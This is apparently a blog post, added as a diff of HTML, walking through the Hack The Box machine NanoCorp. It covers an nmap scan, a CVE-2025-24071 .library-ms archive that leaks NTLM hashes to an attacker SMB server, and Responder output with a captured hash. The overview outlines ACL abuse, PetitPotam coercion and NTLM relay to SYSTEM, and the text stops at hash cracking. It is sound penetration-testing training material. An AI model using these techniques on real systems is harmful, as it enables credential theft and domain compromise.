@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/06/22/hackthebox-nanocorp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewNanoCorp is a hard-difficulty Windows machine from Hack The Box built entirely around Active Directory abuse and NTLM relaying. It starts off with a careers portal that accepts RAR&#x2F;ZIP ar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: NanoCorp">
+<meta property="og:url" content="http://fouedsaidi.com/2026/06/22/Hackthebox-NanoCorp/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewNanoCorp is a hard-difficulty Windows machine from Hack The Box built entirely around Active Directory abuse and NTLM relaying. It starts off with a careers portal that accepts RAR&#x2F;ZIP ar">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/NanoCorp/NanoCorp.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/NanoCorp/creds.png">
+<meta property="article:published_time" content="2026-06-22T18:24:38.000Z">
+<meta property="article:modified_time" content="2026-06-23T14:57:52.420Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/NanoCorp/NanoCorp.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: NanoCorp -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: NanoCorp</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-06-22 21:24:38</span>
+        <span class="mobile">2026-06-22 21:24:38</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-06-23 17:57:52</span>
+            <span class="mobile">2026-06-23 17:57:52</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>NanoCorp is a hard-difficulty Windows machine from Hack The Box built entirely around Active Directory abuse and NTLM relaying. It starts off with a careers portal that accepts RAR&#x2F;ZIP archive uploads, which we abuse through <code>CVE-2025-24071</code> to smuggle a malicious <code>.library-ms</code> file inside a ZIP and coerce an NTLM hash leak. With <code>Responder</code> listening, the box authenticates back to us and we capture the <code>web_svc</code> NetNTLMv2 hash, which cracks against <code>rockyou</code>. From there we fix the Kerberos clock skew, abuse a chain of ACLs with <code>bloodyAD</code> (adding ourselves into <code>IT_SUPPORT</code> to inherit a <code>ForceChangePassword</code> over <code>monitoring_svc</code>), and log in over WinRM-HTTPS to grab the user flag. For root, we register a crafted DNS record with <code>krbrelayx</code>‘s <code>dnstool</code>, coerce the Domain Controller into authenticating to us via <code>PetitPotam</code>, and relay that authentication straight to <code>winrms://</code> on the DC with <code>ntlmrelayx</code>, landing an interactive shell as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/NanoCorp/NanoCorp.png"
+                      alt="NanoCorp-info-card"
+                ><figcaption>NanoCorp-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE           VERSION</span><br><span class="line">53/tcp   open  domain            Simple DNS Plus</span><br><span class="line">80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)</span><br><span class="line">|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12</span><br><span class="line">|_http-title: Did not follow redirect to http://nanocorp.htb/</span><br><span class="line">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 12:05:55Z)</span><br><span class="line">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ldapssl?</span><br><span class="line">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  globalcatLDAPssl?</span><br><span class="line">3389/tcp open  ms-wbt-server     Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.nanocorp.htb</span><br><span class="line">| Not valid before: 2025-10-20T01:58:09</span><br><span class="line">|_Not valid after:  2026-04-21T01:58:09</span><br><span class="line">|_ssl-date: 2025-11-09T12:07:22+00:00; +7h00m01s from scanner time.</span><br><span class="line">5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.nanocorp.htb</span><br><span class="line">| Subject Alternative Name: DNS:dc01.nanocorp.htb</span><br><span class="line">| Not valid before: 2025-04-06T22:58:43</span><br><span class="line">|_Not valid after:  2026-04-06T23:18:43</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-11-09T12:06:42</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   306.59 ms 10.10.16.1</span><br><span class="line">2   539.84 ms 10.129.129.217</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The scan paints a very familiar picture: this is a Domain Controller for the <code>nanocorp.htb</code> domain (<code>DC01</code>). We have the full Active Directory port set (53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269), RDP on <code>3389</code>, and an Apache&#x2F;PHP web server on <code>80</code>. The one port that immediately stands out is <code>5986</code> (WinRM over HTTPS) — a clean remote-management path we’ll be coming back to later. One thing worth noting early is the <code>7h00m00s</code> clock skew between us and the DC; that will break Kerberos unless we correct it before authenticating.</p>
+<p>Let’s add the hostnames to our <code>/etc/hosts</code> and start with the web server.</p>
+<h3 id="Web-Application-http-nanocorp-htb"><a href="#Web-Application-http-nanocorp-htb" class="headerlink" title="Web Application - http://nanocorp.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://nanocorp.htb/" >http://nanocorp.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>Browsing the site lands us on the NanoCorp corporate page. The interesting bit is the careers section — clicking on <strong>Apply Now</strong> redirects us to a dedicated hiring subdomain:</p>
+<p>click on apply now and get ridirected to <a class="link"   target="_blank" rel="noopener" href="http://hire.nanocorp.htb/" >http://hire.nanocorp.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>The hiring portal exposes a file-upload feature meant for candidates to submit their CVs, and crucially it accepts <strong>archive</strong> files (RAR&#x2F;ZIP) rather than plain documents. An upload endpoint that extracts attacker-controlled archives server-side is a textbook setup for <code>CVE-2025-24071</code>.</p>
+<h2 id="Initial-Foothold-CVE-2025-24071-NTLM-Hash-Leak"><a href="#Initial-Foothold-CVE-2025-24071-NTLM-Hash-Leak" class="headerlink" title="Initial Foothold - CVE-2025-24071 NTLM Hash Leak"></a>Initial Foothold - CVE-2025-24071 NTLM Hash Leak</h2><p><code>CVE-2025-24071</code> abuses the way Windows Explorer auto-parses <code>.library-ms</code> files. By embedding a <code>.library-ms</code> whose <code>&lt;simpleLocation&gt;</code> points at a UNC path (<code>\\attacker-ip\share</code>) inside a ZIP&#x2F;RAR archive, simply having that archive extracted&#x2F;indexed forces the host to reach out over SMB to our machine — leaking the NetNTLMv2 hash of whatever account performs the extraction. There’s a clean public PoC that generates the malicious archive for us:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/0x6rss/CVE-2025-24071_PoC" >0x6rss&#x2F;CVE-2025-24071_PoC: CVE-2025-24071: NTLM Hash Leak via RAR&#x2F;ZIP Extraction and .library-ms File <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>We generate the ZIP with our attacker IP baked into the <code>.library-ms</code>, fire up <code>Responder</code> to catch the inbound authentication, and submit the archive through the careers portal:</p>
+<p>upload the created zip with our attacker ip to the careers portal and launch responder</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -I tun0</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.6.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To kill this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.16.13]</span><br><span class="line">    Responder IPv6             [dead:beef:4::100b]</span><br><span class="line">    Challenge set              [random]</span><br><span class="line">    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]</span><br><span class="line">    Don&#x27;t Respond To MDNS TLD  [&#x27;_DOSVC&#x27;]</span><br><span class="line">    TTL for poisoned response  [default]</span><br><span class="line"></span><br><span class="line">[+] Current Session Variables:</span><br><span class="line">    Responder Machine Name     [WIN-VADUYRB60F0]</span><br><span class="line">    Responder Domain Name      [BMXA.LOCAL]</span><br><span class="line">    Responder DCE-RPC Port     [49533]</span><br><span class="line"></span><br><span class="line">[+] Listening for events...                                                                                                   </span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.129.217</span><br><span class="line">[SMB] NTLMv2-SSP Username : NANOCORP\web_svc</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:c15579ccdd08880f:06385BEDDA7FA8C5D894AB0A30489259:010100000000000000F3086D0D51DC012B45944852B00347000000000200080042004D005800410001001E00570049004E002D005600410044005500590052004200360030004600300004003400570049004E002D00560041004400550059005200420036003000460030002E0042004D00580041002E004C004F00430041004C000300140042004D00580041002E004C004F00430041004C000500140042004D00580041002E004C004F00430041004C000700080000F3086D0D51DC0106000400020000000800300030000000000000000000000000200000D2A225C81976D4C1622E92CBF7FD49BB56191F2FD2CD9AB1AFFEC7A1F1DF34EE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310033000000000000000000                                </span><br><span class="line">[*] Skipping previously captured hash for NANOCORP\web_svc</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Within a few seconds the box reaches back out to our SMB server and <code>Responder</code> captures a NetNTLMv2 hash for the service account <code>NANOCORP\web_svc</code>.</p>
+<h3 id="Cracking-the-NetNTLMv2-Hash"><a href="#Cracking-the-NetNTLMv2-Hash" class="headerlink" title="Cracking the NetNTLMv2 Hash"></a>Cracking the NetNTLMv2 Hash</h3><p>NetNTLMv2 isn’t pass-the-hash material, but it’s perfectly crackable offline. We drop the captured hash into a file and let <code>john</code> chew through <code>rockyou</code>:</p>
